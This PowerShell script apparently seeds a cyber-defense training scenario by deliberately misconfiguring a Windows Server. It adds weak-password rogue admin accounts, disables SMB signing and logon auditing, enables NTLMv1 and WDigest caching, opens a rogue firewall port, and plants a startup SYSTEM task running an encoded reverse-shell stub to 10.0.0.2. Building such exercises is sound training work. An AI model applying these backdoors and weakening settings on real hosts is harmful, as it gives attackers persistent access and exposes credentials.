# Hivestorm HS20 scenario-04 — Windows Server 2019 misconfigurations.
$ErrorActionPreference = "Stop"

$roles = Get-Content C:\ProgramData\sysrepair\roles.json | ConvertFrom-Json
$admin       = $roles.admin_user
$adminPw     = $roles.admin_weak_password
$rogue       = $roles.rogue_admin
$schtaskName = $roles.schtask_name
$fwPort      = $roles.rogue_firewall_port
$fwRule      = $roles.rogue_firewall_rule

# ---- users --------------------------------------------------------------------
$securePw = ConvertTo-SecureString $adminPw -AsPlainText -Force
New-LocalUser -Name $admin -Password $securePw -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $admin

$rogueSecure = ConvertTo-SecureString "Changeme!1" -AsPlainText -Force
New-LocalUser -Name $rogue -Password $rogueSecure -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $rogue

# ---- SMB signing not required -------------------------------------------------
$lm = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Set-ItemProperty -Path $lm -Name RequireSecuritySignature -Value 0 -Type DWord
Set-ItemProperty -Path $lm -Name EnableSecuritySignature  -Value 0 -Type DWord

# ---- LmCompatibilityLevel = 0 (NTLMv1 allowed) --------------------------------
$lsa = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $lsa -Name LmCompatibilityLevel -Value 0 -Type DWord

# ---- WDigest credential caching enabled ---------------------------------------
$wdigest = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
if (-not (Test-Path $wdigest)) { New-Item -Path $wdigest -Force | Out-Null }
Set-ItemProperty -Path $wdigest -Name UseLogonCredential -Value 1 -Type DWord

# ---- rogue inbound firewall rule ---------------------------------------------
# MpsSvc / BFE are present but non-functional on Server-Core containers (the
# RPC endpoint mapper needed by New-NetFirewallRule is unavailable). On real
# Windows hosts, persistent firewall rules are stored as registry values under
# FirewallPolicy\FirewallRules — which is exactly what netsh / NetFirewallRule
# cmdlets write to on disk. Plant the rogue rule directly at that registry
# path so the misconfig is genuinely present at seed time and the defender has
# to actually delete it (either via Remove-NetFirewallRule on a live host, or
# via registry cleanup — both channels resolve to the same storage).
$fwRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules'
if (-not (Test-Path $fwRegPath)) { New-Item -Path $fwRegPath -Force | Out-Null }
$ruleValue = "v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=$fwPort|App=*|Name=$fwRule|Desc=Hivestorm rogue rule|"
Set-ItemProperty -Path $fwRegPath -Name $fwRule -Value $ruleValue -Type String
# Best-effort live plant so VM/real-host variants still see a NetFirewallRule.
try {
    New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -Protocol TCP `
        -LocalPort $fwPort -Action Allow -Profile Any -ErrorAction Stop | Out-Null
} catch {}

# ---- scheduled task (SYSTEM) with encoded-command reverse shell ---------------
$payload = "`$c=New-Object Net.Sockets.TCPClient('10.0.0.2',$fwPort);" +
           "`$s=`$c.GetStream();[byte[]]`$b=0..65535|%%{0};" +
           "while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){ }"
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes($payload))
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
           -Argument "-NoProfile -EncodedCommand $encoded"
$trigger = New-ScheduledTaskTrigger -AtStartup
$princ   = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $schtaskName -Action $action -Trigger $trigger `
    -Principal $princ -Force | Out-Null

# ---- audit policy gutted: logon success not audited ---------------------------
auditpol.exe /set /subcategory:"Logon" /success:disable /failure:disable | Out-Null

# ---- PowerShell v2 registry flag (legacy engine) ------------------------------
$ps2 = "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine"
# This key is TrustedInstaller-owned in Server-Core containers; write fails
# with SecurityException even as ContainerAdministrator. Best-effort.
try {
    if (-not (Test-Path $ps2)) { New-Item -Path $ps2 -Force | Out-Null }
    Set-ItemProperty -Path $ps2 -Name PowerShellVersion -Value "2.0" -ErrorAction Stop
} catch { Write-Warning "PowerShellEngine key plant skipped: $_" }
